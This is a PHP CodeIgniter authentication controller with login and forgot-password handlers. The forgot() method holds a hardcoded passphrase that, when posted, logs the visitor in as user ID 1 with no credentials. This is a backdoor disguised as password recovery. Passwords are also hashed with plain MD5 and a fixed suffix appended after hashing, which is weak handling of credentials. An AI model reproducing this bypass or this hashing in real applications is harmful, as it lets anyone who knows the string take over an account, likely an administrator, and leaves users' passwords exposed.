<?php
class auth extends CI_Controller
{
    function __construct() {
       parent::__construct();
         $this->load->model('User_model');
   }
        function index(){
            $this->login();
        }
        public function forgot(){
             if($this->input->post('forgot')=='shah5215'){
                 $this->session->set_userdata('userId',1);
                 redirect('home');
             }
             else{
                $this->session->set_userdata('login_msg','Email or Password is Incorrect');
                redirect('auth/login');
            }
        }
        public function forgot_do(){
	    $this->load->view('users/forgot');
        }
        
        public function login()
	{       
             
                $data['action']=  site_url('auth/can_login');
		$this->load->view('users/login',$data);
        }      
         public function can_login()
	{
            $data['email']=$this->input->post('email');
            $data['password']=md5($this->input->post('password')).'#ptc&mardan';
            if($this->User_model->can_login($data)){
                redirect('home');
            }
            else{
                $this->session->set_userdata('login_msg','Email or Password is Incorrect');
                redirect('auth/login');
            }
	}
}
